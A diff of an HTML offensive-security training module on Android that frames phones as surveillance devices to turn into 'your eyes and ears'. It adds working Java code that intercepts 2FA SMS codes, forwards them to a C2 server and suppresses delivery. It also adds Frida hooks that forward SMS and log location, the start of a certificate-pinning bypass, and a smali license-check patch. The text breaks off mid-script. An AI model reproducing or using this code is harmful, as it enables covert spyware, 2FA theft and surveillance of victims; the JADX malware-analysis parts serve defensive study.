@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -127,6 +144,7 @@
             padding: 1rem;
             background: #0f0f15;
             border-radius: 8px;
+            flex-wrap: wrap;
         }
         .android-node {
             text-align: center;
@@ -134,7 +152,8 @@
             border: 1px solid var(--border);
             border-radius: 8px;
             flex: 1;
-            margin: 0 0.5rem;
+            margin: 0.5rem;
+            min-width: 120px;
         }
         .android-node h5 { color: var(--accent2); margin-bottom: 0.5rem; }
         .android-arrow {
@@ -151,12 +170,182 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .architecture-layer {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 0.5rem 0;
+            text-align: center;
+        }
+        .architecture-layer h5 { color: var(--accent2); margin-bottom: 0.3rem; }
+        .architecture-layer p { font-size: 0.85rem; color: var(--dim); }
+        .layer-arrow {
+            text-align: center;
+            font-size: 20px;
+            color: var(--accent);
+            margin: 0.2rem 0;
+        }
+        .apk-structure {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+        }
+        .apk-structure .dir { color: var(--accent2); }
+        .apk-structure .file { color: var(--neon); }
+        .apk-structure .comment { color: var(--dim); font-style: italic; }
+        .smali-code {
+            background: #1a1a2e;
+            border-left: 4px solid var(--purple);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 8px 8px 0;
+            overflow-x: auto;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+            position: relative;
+        }
+        .frida-code {
+            background: #1a1a2e;
+            border-left: 4px solid var(--amber);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 8px 8px 0;
+            overflow-x: auto;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+            position: relative;
+        }
+        .rat-feature {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 0.5rem 0;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        .rat-feature .icon { font-size: 2rem; }
+        .rat-feature h5 { color: var(--accent); margin-bottom: 0.3rem; }
+        .rat-feature p { font-size: 0.9rem; color: var(--dim); }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="nav">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_17_SOCIAL_ENGINEERING.html">← Module 17</a>
             <a href="MODULE_19_AD.html">Module 19 →</a>
         </div>
@@ -168,62 +357,404 @@
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>Android phones are computers. They run Linux, have file systems, execute code, and connect to networks. But they're treated as appliances — users install apps without reading permissions, grant access without understanding, and carry them everywhere. A compromised phone is a surveillance device that the victim willingly charges and keeps close.</p>
+            <p>Android phones are computers. They run Linux, have file systems, execute code, and connect to networks. But they're treated as appliances — users install apps without reading permissions, grant access without understanding, and carry them everywhere. A compromised phone is a <span class="neon-highlight">surveillance device</span> that the victim willingly charges and keeps close.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> Android holds GPS coordinates, SMS history, contact lists, photos, camera access, microphone access, and authentication tokens. If you can install software on it, you own the <span class="neon-amber">radio, camera, microphone, and GPS</span>. You don't need to plant a bug — the target plants it on themselves every day.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
-            <p>Everyone carries a radio, camera, microphone, and GPS tracker in their pocket. They call it a phone. If you can install software on it, you own the radio, the camera, the microphone, and the GPS. You don't need to plant a bug — the target plants it on themselves every day. This module teaches you to turn their phone into your eyes and ears.</p>
+            <p>Everyone carries a radio, camera, microphone, and GPS tracker in their pocket. They call it a phone. If you can install software on it, you own the radio, the camera, the microphone, and the GPS. This module teaches you to turn their phone into your eyes and ears.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The security guard (Google Play Protect) sees a normal app and waves it through. They never check what the app actually does.</p>
         </div>
 
-        <h2>The Android Attack Surface</h2>
-
-        <div class="android-flow">
-            <div class="android-node">
-                <h5>📱 APP STORE</h5>
-                <p>Malicious app</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Social engineering</p>
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>How Android communicates over Wi-Fi, mobile data, and Bluetooth. Understanding network protocols is essential for C2 beacon design.</p>
             </div>
-            <div class="android-arrow">→</div>
-            <div class="android-node">
-                <h5>🔓 SIDELOAD</h5>
-                <p>APK install</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">"Unknown sources"</p>
+            <div class="method-card">
+                <h4><a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14: Cloud Files</a></h4>
+                <p>Exfiltrating data from Android to cloud storage. Many Android RATs use cloud services as dead-drop C2 channels.</p>
             </div>
-            <div class="android-arrow">→</div>
-            <div class="android-node">
-                <h5>🎯 EXPLOIT</h5>
-                <p>Browser/Stagefright</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Zero-click</p>
+            <div class="method-card">
+                <h4><a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a></h4>
+                <p>Command and control architecture. Android RATs use the same C2 principles — beaconing, command parsing, result exfiltration.</p>
             </div>
-            <div class="android-arrow">→</div>
-            <div class="android-node">
-                <h5>🐀 PERSISTENCE</h5>
-                <p>System app</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Boot receiver</p>
+            <div class="method-card">
+                <h4><a href="MODULE_20_KILL_CHAIN.html" class="cross-link">Module 20: Kill Chain</a></h4>
+                <p>The full attack lifecycle. Android compromises follow the same kill chain — recon, weaponization, delivery, exploitation, installation, C2, actions.</p>
             </div>
         </div>
 
-        <h2>Method 1: Malicious APK (Social Engineering)</h2>
+        <h2>🏗️ Android Architecture — The Foundation</h2>
+        <p>Before you can exploit Android, you must understand how it works. Android is a <span class="neon-highlight">stacked architecture</span> built on Linux:</p>
+
+        <div class="architecture-layer">
+            <h5>📱 APPLICATIONS</h5>
+            <p>User apps, system apps, launchers, browsers</p>
+            <p style="font-size: 0.8rem; color: var(--dim);">Written in Java/Kotlin, compiled to Dalvik bytecode (DEX)</p>
+        </div>
+        <div class="layer-arrow">↓</div>
+        <div class="architecture-layer">
+            <h5>🔧 APPLICATION FRAMEWORK</h5>
+            <p>Activity Manager, Package Manager, Telephony Manager, Location Manager</p>
+            <p style="font-size: 0.8rem; color: var(--dim);">The APIs your app calls to access GPS, SMS, camera, contacts</p>
+        </div>
+        <div class="layer-arrow">↓</div>
+        <div class="architecture-layer">
+            <h5>⚙️ NATIVE LIBRARIES</h5>
+            <p>WebKit, OpenGL, SQLite, Media Framework, libc</p>
+            <p style="font-size: 0.8rem; color: var(--dim);">C/C++ libraries compiled for ARM/x86. Where root exploits live.</p>
+        </div>
+        <div class="layer-arrow">↓</div>
+        <div class="architecture-layer">
+            <h5>🐧 ANDROID RUNTIME (ART) + LINUX KERNEL</h5>
+            <p>Dalvik/ART virtual machine, process management, memory management, security</p>
+            <p style="font-size: 0.8rem; color: var(--dim);">The Linux kernel with Android-specific patches. Root = kernel compromise.</p>
+        </div>
+        <div class="layer-arrow">↓</div>
+        <div class="architecture-layer">
+            <h5>🔌 HARDWARE ABSTRACTION LAYER (HAL)</h5>
+            <p>Drivers for camera, GPS, Bluetooth, Wi-Fi, sensors</p>
+            <p style="font-size: 0.8rem; color: var(--dim);">Where hardware meets software. Custom ROMs modify this layer.</p>
+        </div>
+
+        <div class="why-box">
+            <h5>Why the architecture matters</h5>
+            <p>Your malicious app lives at the <span class="neon-highlight">Application layer</span>. It calls the <span class="neon-amber">Application Framework</span> APIs to access GPS, SMS, camera. The framework talks to <span class="neon-purple">Native Libraries</span> and the <span class="neon-purple">Linux Kernel</span>. If you want to bypass permissions, you need to go deeper — either exploit a native library vulnerability or gain root access to the kernel.</p>
+        </div>
+
+        <h2>📦 APK Structure — The Android Package</h2>
+        <p>An APK (Android Package Kit) is just a ZIP file with a specific structure. Understanding this is essential for reverse engineering and malware analysis:</p>
+
+        <div class="apk-structure">
+<span class="dir">MyApp.apk</span> (ZIP archive)
+├── <span class="dir">META-INF/</span>                    <span class="comment">← Signature & certificate</span>
+│   ├── <span class="file">MANIFEST.MF</span>              <span class="comment">← File hashes</span>
+│   ├── <span class="file">CERT.SF</span>                <span class="comment">← Signature block</span>
+│   └── <span class="file">CERT.RSA</span>               <span class="comment">← Public key certificate</span>
+├── <span class="dir">res/</span>                       <span class="comment">← Compiled resources (images, layouts)</span>
+│   ├── <span class="dir">drawable/</span>
+│   ├── <span class="dir">layout/</span>
+│   ├── <span class="dir">values/</span>
+│   └── <span class="dir">...</span>
+├── <span class="dir">lib/</span>                       <span class="comment">← Native libraries (.so files)</span>
+│   ├── <span class="dir">armeabi-v7a/</span>
+│   ├── <span class="dir">arm64-v8a/</span>
+│   └── <span class="dir">x86/</span>
+├── <span class="file">AndroidManifest.xml</span>          <span class="comment">← App config (permissions, components)</span>
+├── <span class="file">classes.dex</span>                  <span class="comment">← Compiled Java/Kotlin bytecode</span>
+├── <span class="file">classes2.dex</span>                 <span class="comment">← Multi-dex for large apps</span>
+├── <span class="file">resources.arsc</span>               <span class="comment">← Compiled resource index</span>
+└── <span class="file">assets/</span>                      <span class="comment">← Raw files (fonts, configs, payloads)</span>
+        </div>
+
+        <div class="why-box">
+            <h5>Why APK structure matters for attackers</h5>
+            <p>The <span class="neon-highlight">AndroidManifest.xml</span> declares every permission the app requests. Reverse engineers read this first. The <span class="neon-amber">classes.dex</span> contains your malicious code — this is what JADX and apktool decompile. The <span class="neon-purple">lib/</span> directory holds native code that can bypass Java-level detection. The <span class="neon-purple">assets/</span> directory can hide encrypted payloads.</p>
+        </div>
+
+        <h2>🔐 Android Permissions — The Attack Surface</h2>
+        <p>Android permissions are the gatekeepers. Every sensitive operation requires permission. Users grant them blindly. You design your pretext to justify the permissions you need:</p>
 
         <div class="step-box">
-            <h4>Step 1: Build the Trojan App</h4>
-            <p>We create an app that looks legitimate but contains a hidden payload. The payload runs as a background service, invisible to the user.</p>
+            <h4>Normal Permissions (Granted Automatically)</h4>
+            <table>
+                <tr>
+                    <th>Permission</th>
+                    <th>What It Gives</th>
+                    <th>Attack Value</th>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">INTERNET</span></td>
+                    <td>Network access</td>
+                    <td>C2 beaconing, data exfiltration</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">ACCESS_NETWORK_STATE</span></td>
+                    <td>Wi-Fi/mobile status</td>
+                    <td>Know when to beacon, conserve data</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">FOREGROUND_SERVICE</span></td>
+                    <td>Run persistent service</td>
+                    <td>Background persistence without killing</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="step-box">
+            <h4>Dangerous Permissions (Require User Approval)</h4>
+            <table>
+                <tr>
+                    <th>Permission</th>
+                    <th>What It Gives</th>
+                    <th>Attack Value</th>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">ACCESS_FINE_LOCATION</span></td>
+                    <td>GPS coordinates (precise)</td>
+                    <td>Real-time tracking, geofencing</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">READ_SMS / SEND_SMS</span></td>
+                    <td>Read/send text messages</td>
+                    <td>2FA interception, premium SMS fraud</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">READ_CONTACTS</span></td>
+                    <td>Contact list</td>
+                    <td>Social graph, spear-phishing targets</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">RECORD_AUDIO</span></td>
+                    <td>Microphone access</td>
+                    <td>Room audio surveillance</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">CAMERA</span></td>
+                    <td>Camera access</td>
+                    <td>Photo/video capture, document scanning</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">READ_EXTERNAL_STORAGE</span></td>
+                    <td>Read files (photos, docs)</td>
+                    <td>Data theft, credential harvesting</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">READ_PHONE_STATE</span></td>
+                    <td>IMEI, phone number, IMSI</td>
+                    <td>Device fingerprinting, SIM tracking</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">CALL_PHONE</span></td>
+                    <td>Make phone calls</td>
+                    <td>Premium call fraud, voice phishing</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Permission Pre-Texting</h5>
+            <p>A flashlight app that asks for camera, microphone, and location seems suspicious — but a <span class="neon-amber">"COVID-19 Tracker"</span> or <span class="neon-amber">"Dating App"</span> that asks for contacts, location, and SMS seems reasonable. The pretext justifies the permissions. The user complies. This is social engineering at the permission level.</p>
+        </div>
+
+        <h2>🎯 Intent Filters — The Inter-App Communication</h2>
+        <p>Android apps communicate via <span class="neon-highlight">Intents</span> — messages that request actions from other apps. Intent filters declare what actions an app can handle. This is both a feature and an attack surface:</p>
+
+        <div class="code-block">
+=== INTENT FILTER EXAMPLE ===
+&lt;activity android:name=".MaliciousActivity"&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name="android.intent.action.VIEW" /&gt;
+        &lt;category android:name="android.intent.category.DEFAULT" /&gt;
+        &lt;data android:scheme="http" android:host="*" /&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;
+
+=== WHAT THIS DOES ===
+# This app registers to handle ALL HTTP links
+# When user clicks any http:// link, Android offers this app
+# If user selects "Always", this app intercepts ALL web browsing
+# Phishing opportunity: intercept banking URLs, show fake login
+        </div>
+
+        <div class="code-block">
+=== INTENT HIJACKING (CODE) ===
+// Register as a handler for SMS_RECEIVED
+IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+filter.setPriority(999); // Highest priority — intercept before real app
+registerReceiver(new SmsInterceptor(), filter);
+
+// SmsInterceptor.java
+public class SmsInterceptor extends BroadcastReceiver {
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        Bundle bundle = intent.getExtras();
+        SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent);
+        for (SmsMessage msg : msgs) {
+            String body = msg.getMessageBody();
+            // Intercept 2FA codes
+            if (body.contains("verification code") || body.contains("OTP")) {
+                // Forward to C2 server
+                forwardToC2(msg.getOriginatingAddress(), body);
+                abortBroadcast(); // PREVENT real app from receiving it!
+            }
+        }
+    }
+}
+        </div>
+
+        <div class="why-box">
+            <h5>Why Intent hijacking is powerful</h5>
+            <p>By setting <span class="neon-highlight">android:priority="999"</span>, your app receives the Intent BEFORE the legitimate app. You can read the data, modify it, or even <span class="neon-amber">abortBroadcast()</span> to prevent the real app from ever seeing it. This is how banking trojans intercept 2FA SMS codes in real time.</p>
+        </div>
+
+        <h2>📝 Smali Basics — Android Assembly</h2>
+        <p>When you decompile an APK with apktool, you get <span class="neon-highlight">Smali</span> — the human-readable form of Dalvik bytecode. Understanding Smali is essential for reverse engineering and patching apps:</p>
+
+        <div class="smali-code">
+=== JAVA vs SMALI ===
+
+// Java: Simple method
+public int add(int a, int b) {
+    return a + b;
+}
+
+// Smali: Same method
+.method public add(II)I
+    .registers 3
+    add-int v0, p1, p2
+    return v0
+.end method
+
+=== SMALI REGISTERS ===
+# v0-vN  → Local variables
+# p0     → this (in non-static methods)
+# p1-pN  → Method parameters
+# All operations use registers, not stack
+        </div>
+
+        <div class="smali-code">
+=== SMALI INSTRUCTIONS ===
+
+# Data movement
+const-string v0, "hello"     # Load string into v0
+move v1, v0                  # Copy v0 to v1
+
+# Arithmetic
+add-int v2, v0, v1           # v2 = v0 + v1
+sub-int v2, v0, v1           # v2 = v0 - v1
+
+# Method calls
+invoke-virtual {p0, v0}, Lcom/example/MyClass;->methodName(Ljava/lang/String;)V
+# p0 = this, v0 = parameter
+
+# Field access
+iget-object v0, p0, Lcom/example/MyClass;->fieldName:Ljava/lang/String;
+# v0 = this.fieldName
+
+# Conditional branching
+if-eq v0, v1, :label_equal   # Jump if v0 == v1
+if-ne v0, v1, :label_not_equal
+if-gt v0, v1, :label_greater
+
+# Return
+return-void                  # Return nothing
+return-object v0             # Return object in v0
+return v0                    # Return primitive in v0
+        </div>
+
+        <div class="smali-code">
+=== PATCHING APK WITH SMALI ===
+# Goal: Remove a license check
+
+# Original Smali:
+invoke-virtual {p0}, Lcom/example/app;->checkLicense()Z
+move-result v0
+if-nez v0, :license_valid    # Jump if license check passes
+    # Show "License invalid" dialog
+    return-void
+:license_valid
+
+# Patched Smali (always valid):
+invoke-virtual {p0}, Lcom/example/app;->checkLicense()Z
+move-result v0
+const v0, 0x1                # Force v0 = 1 (true)
+if-nez v0, :license_valid    # Always jumps
+    # This code is now unreachable
+    return-void
+:license_valid
+# App continues as if licensed
+        </div>
+
+        <div class="why-box">
+            <h5>Why Smali matters for red teams</h5>
+            <p>When you reverse engineer a target app, you read Smali. When you patch an app to bypass certificate pinning, you edit Smali. When you inject malicious code into a legitimate app, you add Smali. <span class="neon-amber">Smali is the language of Android reverse engineering.</span></p>
+        </div>
+
+        <h2>🔍 Reverse Engineering with JADX</h2>
+        <p><span class="neon-highlight">JADX</span> is the gold standard for Android reverse engineering. It decompiles APKs back to readable Java/Kotlin source code. Unlike apktool (which gives Smali), JADX gives you something close to the original source:</p>
+
+        <div class="step-box">
+            <h4>Step 1: Install JADX</h4>
+            <div class="code-block">
+# Download JADX from https://github.com/skylot/jadx
+# Or install via package manager:
+
+# macOS
+brew install jadx
+
+# Linux
+sudo apt-get install jadx
+
+# Windows
+# Download jadx-gui-<version>-windows.zip, extract, run jadx-gui.exe
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Step 2: Decompile an APK</h4>
+            <div class="code-block">
+=== COMMAND LINE ===
+# Decompile to directory
+jadx -d output_dir target_app.apk
+
+# Decompile with resources
+jadx -r -d output_dir target_app.apk
+
+# Decompile with deobfuscation (for ProGuard/R8 obfuscated apps)
+jadx --deobf -d output_dir target_app.apk
+
+=== GUI ===
+# 1. Open jadx-gui
+# 2. File → Open File → Select APK
+# 3. Browse decompiled source in tree view
+# 4. Search for strings, methods, classes
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Step 3: What to Look For in Malware Analysis</h4>
+            <div class="code-block">
+=== JADX SEARCH STRATEGY ===
+
+# 1. Search for suspicious permissions in AndroidManifest.xml
+#    Look for: READ_SMS, RECORD_AUDIO, ACCESS_FINE_LOCATION
+#    combined with INTERNET
+
+# 2. Search for hardcoded URLs/IPs
+Search: "http://" or "https://" or IP patterns
+#    C2 servers are often hardcoded (or obfuscated)
+
+# 3. Search for suspicious class names
+Search: "Rat", "Payload", "Shell", "Root", "Exploit"
+
+# 4. Search for native library loading
+Search: System.loadLibrary("native-lib")
+#    Native code can hide malicious behavior from Java analysis
+
+# 5. Search for reflection and dynamic loading
+Search: Class.forName, DexClassLoader, PathClassLoader
+#    These are used to load encrypted payloads at runtime
+
+# 6. Search for SMS interception
+Search: "SMS_RECEIVED", "abortBroadcast", "getMessageBody"
+
+# 7. Search for location access
+Search: "getLastKnownLocation", "requestLocationUpdates"
+            </div>
+        </div>
+
+        <div class="evidence-box">
+            <h3>📊 JADX Analysis Example: StarKiller RAT</h3>
+            <p><strong>Scenario:</strong> Analyzing a suspicious APK that claims to be a "System Update" app.</p>
 
             <div class="code-block">
-=== ANDROID PROJECT STRUCTURE ===
-MyApp/
-├── app/
-│   ├── src/main/
-│   │   ├── AndroidManifest.xml
-│   │   ├── java/com/example/myapp/
-│   │   │   ├── MainActivity.java      ← Legitimate UI
-│   │   │   └── RatService.java        ← Hidden payload
-│   │   └── res/layout/
-│   │       └── activity_main.xml
-│   └── build.gradle
-
-=== AndroidManifest.xml (KEY PERMISSIONS) ===
+=== DECOMPILED MANIFEST (JADX) ===
 &lt;manifest&gt;
     &lt;uses-permission android:name="android.permission.INTERNET" /&gt;
     &lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /&gt;
@@ -233,169 +764,658 @@ MyApp/
     &lt;uses-permission android:name="android.permission.READ_CONTACTS" /&gt;
     &lt;uses-permission android:name="android.permission.CAMERA" /&gt;
     &lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" /&gt;
+    &lt;uses-permission android:name="android.permission.READ_PHONE_STATE" /&gt;
+    &lt;uses-permission android:name="android.permission.FOREGROUND_SERVICE" /&gt;
+    &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" /&gt;
     
-    &lt;application&gt;
-        &lt;activity android:name=".MainActivity"&gt;
-            &lt;intent-filter&gt;
-                &lt;action android:name="android.intent.action.MAIN" /&gt;
-                &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
-            &lt;/intent-filter&gt;
-        &lt;/activity&gt;
-        
-        &lt;service android:name=".RatService"
+    &lt;application android:name=".App"&gt;
+        &lt;service android:name=".services.MainService"
                  android:enabled="true"
                  android:exported="false" /&gt;
-        
-        &lt;receiver android:name=".BootReceiver"&gt;
+        &lt;receiver android:name=".receivers.BootReceiver"&gt;
             &lt;intent-filter&gt;
                 &lt;action android:name="android.intent.action.BOOT_COMPLETED" /&gt;
             &lt;/intent-filter&gt;
         &lt;/receiver&gt;
     &lt;/application&gt;
 &lt;/manifest&gt;
-            </div>
 
-            <div class="warning-box">
-                <h5>⚠️ Why so many permissions?</h5>
-                <p>Android users are trained to click "Allow" without reading. A flashlight app that asks for camera, microphone, and location seems suspicious — but a "COVID-19 Tracker" or "Dating App" that asks for contacts, location, and SMS seems reasonable. The pretext justifies the permissions. The user complies.</p>
+=== ANALYSIS NOTES ===
+# 1. 10 permissions including GPS, SMS, contacts, camera, microphone
+# 2. Foreground service + boot receiver = persistence mechanism
+# 3. "System Update" pretext justifies all these permissions
+# 4. This is a classic RAT signature
+            </div>
+        </div>
+
+        <h2>🧪 Dynamic Analysis with Frida</h2>
+        <p><span class="neon-highlight">Frida</span> is a dynamic instrumentation toolkit that lets you inject JavaScript into running Android apps. Unlike JADX (static analysis), Frida shows you what the app actually DOES at runtime:</p>
+
+        <div class="step-box">
+            <h4>Step 1: Install Frida</h4>
+            <div class="code-block">
+# Install Frida on host
+pip install frida-tools
+
+# Install Frida server on Android device/emulator
+# Download frida-server for your architecture (arm/arm64/x86)
+# https://github.com/frida/frida/releases
+
+# Push to device
+adb push frida-server /data/local/tmp/
+adb shell "chmod 755 /data/local/tmp/frida-server"
+
+# Start frida-server (requires root or adb shell)
+adb shell "/data/local/tmp/frida-server &"
             </div>
         </div>
 
         <div class="step-box">
-            <h4>Step 2: The Hidden Service</h4>
-            <p>The RatService runs in the background, invisible to the user. It beacons to the C2 server, receives commands, and executes them.</p>
+            <h4>Step 2: Hook Methods with Frida</h4>
+            <div class="frida-code">
+=== FRIDA SCRIPT: Intercept SMS ===
+Java.perform(function() {
+    // Hook SmsManager.sendTextMessage
+    var SmsManager = Java.use('android.telephony.SmsManager');
+    
+    SmsManager.sendTextMessage.overload(
+        'java.lang.String', 'java.lang.String', 
+        'java.lang.String', 'android.app.PendingIntent', 
+        'android.app.PendingIntent'
+    ).implementation = function(destinationAddress, scAddress, text, 
+                                  sentIntent, deliveryIntent) {
+        console.log("[SMS] To: " + destinationAddress);
+        console.log("[SMS] Body: " + text);
+        
+        // Forward to our C2
+        send({
+            type: 'sms',
+            to: destinationAddress.toString(),
+            body: text.toString()
+        });
+        
+        // Call original method (or block it)
+        return this.sendTextMessage(destinationAddress, scAddress, text, 
+                                     sentIntent, deliveryIntent);
+    };
+});
 
+=== USAGE ===
+frida -U -f com.target.app -l sms_hook.js --no-pause
+# -U = USB device
+# -f = spawn target app
+# -l = load script
+# --no-pause = don't pause at startup
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Step 3: Hook Location APIs</h4>
+            <div class="frida-code">
+=== FRIDA SCRIPT: Track Location Access ===
+Java.perform(function() {
+    var LocationManager = Java.use('android.location.LocationManager');
+    
+    // Hook getLastKnownLocation
+    LocationManager.getLastKnownLocation.implementation = function(provider) {
+        var result = this.getLastKnownLocation(provider);
+        if (result) {
+            console.log("[LOCATION] Provider: " + provider);
+            console.log("[LOCATION] Lat: " + result.getLatitude());
+            console.log("[LOCATION] Lon: " + result.getLongitude());
+            console.log("[LOCATION] Accuracy: " + result.getAccuracy());
+        }
+        return result;
+    };
+    
+    // Hook requestLocationUpdates to see real-time tracking
+    LocationManager.requestLocationUpdates.overload(
+        'java.lang.String', 'long', 'float', 
+        'android.location.LocationListener'
+    ).implementation = function(provider, minTime, minDistance, listener) {
+        console.log("[LOCATION] Real-time tracking started!");
+        console.log("[LOCATION] Provider: " + provider);
+        console.log("[LOCATION] Min time: " + minTime + "ms");
+        return this.requestLocationUpdates(provider, minTime, minDistance, listener);
+    };
+});
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Step 4: Bypass Certificate Pinning</h4>
+            <div class="frida-code">
+=== FRIDA SCRIPT: Universal SSL Pinning Bypass ===
+Java.perform(function() {
+    // Hook all SSL/TLS verification methods
+    
+    // 1. OkHttp certificate pinner
+    try {
+        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
+        CertificatePinner.check.overload('java.lang.String', 
+            'java.util.List').implementation = function() {
+            console.log("[SSL] OkHttp pinning bypassed");
+            return;
+        };
+    } catch(e) {}
+    
+    // 2. TrustManager verification
+    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+    var SSLContext = Java.use('javax.net.ssl.SSLContext');
+    
+    var TrustManager = Java.registerClass({
+        name: 'com.example.TrustManager',
+        implements: [X509TrustManager],
+        methods: {
